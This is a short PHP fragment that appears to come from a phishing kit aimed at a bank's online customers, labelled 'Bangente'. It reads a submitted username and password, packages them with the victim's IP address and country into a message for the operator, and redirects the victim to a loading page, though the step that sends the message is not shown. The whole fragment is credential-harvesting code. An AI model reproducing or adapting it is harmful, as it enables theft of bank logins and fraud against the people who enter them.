...
if (isset ($_POST['loginu']) && isset ($_POST['psswu'])  ){
	
$message = "Bangente-Info\n\nTipo-Usuario: Personas\n\nUsuario: <code>".$_POST['loginu']."</code>\nClave: <code>".$_POST['psswu']."</code>\n\n=====IPP=====\n".$myip." ".$pais."";
...
header('Location: carga.php?u='.$_POST['loginu'].'&t=1');
